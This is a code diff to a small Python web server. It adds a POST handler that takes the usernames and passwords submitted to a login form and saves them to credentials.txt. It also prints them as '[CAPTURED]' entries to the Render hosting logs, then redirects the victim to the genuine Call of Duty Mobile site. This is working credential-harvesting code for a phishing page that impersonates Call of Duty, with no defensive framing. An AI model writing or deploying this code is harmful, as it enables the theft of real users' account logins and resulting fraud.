@@ -40,3 +40,26 @@ with open("credentials.txt", "a") as log_file:
 
 # ALSO print to console so it shows in Render Logs tab
 print(f"[CAPTURED] {log_entry}", flush=True)
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        post_params = urllib.parse.parse_qs(post_data.decode('utf-8'))
+        
+        username = post_params.get('username', [''])[0]
+        password = post_params.get('password', [''])[0]
+        
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        log_entry = f"{timestamp} | Username: {username}, Password: {password}\n"
+        
+        # Write to file (will be lost on restart, but good to have)
+        with open("credentials.txt", "a") as log_file:
+            log_file.write(log_entry)
+        
+        # Print to console so it shows in Render Logs (flush=True is important!)
+        print(f"\n[CAPTURED] {log_entry}", flush=True)
+        
+        self.send_response(302)
+        self.send_header("Location", "https://www.callofduty.com/mobile")
+        self.end_headers()
+
